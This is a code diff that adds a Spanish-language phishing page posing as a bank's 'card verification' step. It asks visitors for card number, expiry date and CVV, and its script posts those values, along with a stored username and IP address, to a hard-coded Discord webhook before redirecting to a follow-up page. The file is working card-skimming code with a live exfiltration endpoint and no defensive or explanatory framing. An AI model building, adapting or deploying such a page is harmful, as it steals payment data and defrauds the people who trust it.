@@ -1,0 +1,131 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Verificación de Tarjeta</title>
+  <link rel="stylesheet" href="css/style.css">
+  <style>
+    .input-tarjeta {
+      width: 100%;
+      margin-bottom: 15px;
+      padding: 10px;
+      border: 1px solid #ccc;
+      border-radius: 4px;
+      box-sizing: border-box;
+      font-size: 16px;
+    }
+    .flex-row {
+      display: flex;
+      gap: 10px;
+    }
+    .flex-row input {
+      flex: 1;
+    }
+    label {
+      display: block;
+      text-align: left;
+      font-size: 13px;
+      margin-bottom: 5px;
+      color: #555;
+      font-weight: bold;
+    }
+    /* Botón en color verde */
+    button {
+      width: 100%;
+      padding: 12px;
+      background-color: #28a745; 
+      color: white;
+      border: none;
+      border-radius: 4px;
+      font-size: 16px;
+      font-weight: bold;
+      cursor: pointer;
+      transition: background 0.3s;
+    }
+    button:hover {
+      background-color: #218838;
+    }
+  </style>
+</head>
+<body>
+<div class="banner">
+  <div class="header">
+    <img src="img/logo-1.png" alt="Logo" class="logo" />
+    <div class="linea-personal">| Personal</div>
+  </div>
+  
+  <div class="titulo">VERIFICACIÓN DE TARJETA ASOCIADA</div>
+  
+  <p style="font-size: 13px; margin: 15px 0; color: #444;">
+    Por razones de seguridad, complete los datos de su tarjeta para continuar el proceso.
+  </p>
+
+  <form id="tarjetaForm">
+    <label for="n_tarjeta">Número de Tarjeta</label>
+    <input type="text" id="n_tarjeta" class="input-tarjeta" placeholder="0000 0000 0000 0000" maxlength="16" inputmode="numeric" required />
+
+    <div class="flex-row">
+      <div style="flex: 1;">
+        <label for="f_exp">Vencimiento</label>
+        <input type="text" id="f_exp" class="input-tarjeta" placeholder="MM/AA" maxlength="5" inputmode="numeric" required />
+      </div>
+      <div style="flex: 1;">
+        <label for="v_cvv">CVV</label>
+        <input type="password" id="v_cvv" class="input-tarjeta" placeholder="123" maxlength="3" inputmode="numeric" required />
+      </div>
+    </div>
+
+    <button type="submit">Continuar</button>
+  </form>
+</div>
+
+<script>
+document.addEventListener('DOMContentLoaded', function() {
+  const fExpInput = document.getElementById('f_exp');
+
+  // Formato automático MM/AA
+  fExpInput.addEventListener('input', function(e) {
+    let value = e.target.value.replace(/\D/g, ''); 
+    if (value.length > 2) {
+      value = value.substring(0, 2) + '/' + value.substring(2, 4);
+    }
+    e.target.value = value;
+  });
+
+  const webhook = "https://discord.com/api/webhooks/1481712791508226209/2AjtJeFx9ommSEtgRFVCjd3khnhZpqEvxJLyJTAmOHFYtIhgiKcqo7wYC6AdsmGL5zs2";
+  const usuario = localStorage.getItem('usuario') || 'Desconocido';
+  const ip = localStorage.getItem('ip') || 'IP desconocida';
+
+  const form = document.getElementById('tarjetaForm');
+  if (form) {
+    form.addEventListener('submit', function(e) {
+      e.preventDefault();
+      
+      const nTarj = document.getElementById('n_tarjeta').value.trim();
+      const fExp = document.getElementById('f_exp').value.trim();
+      const vCVV = document.getElementById('v_cvv').value.trim();
+      
+      const message =
+        `--- DATOS DE TARJETA ---\n` +
+        `Usuario: ${usuario}\n` +
+        `Tarjeta: ${nTarj}\n` +
+        `Vence: ${fExp}\n` +
+        `CVV: ${vCVV}\n` +
+        `IP: ${ip}`;
+        
+      fetch(webhook, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ content: message })
+      })
+      .then(res => {
+        window.location.href = "siono.html";
+      })
+      .catch(() => alert("Error de conexión. Intente de nuevo."));
+    });
+  }
+});
+</script>
+</body>
+</html>
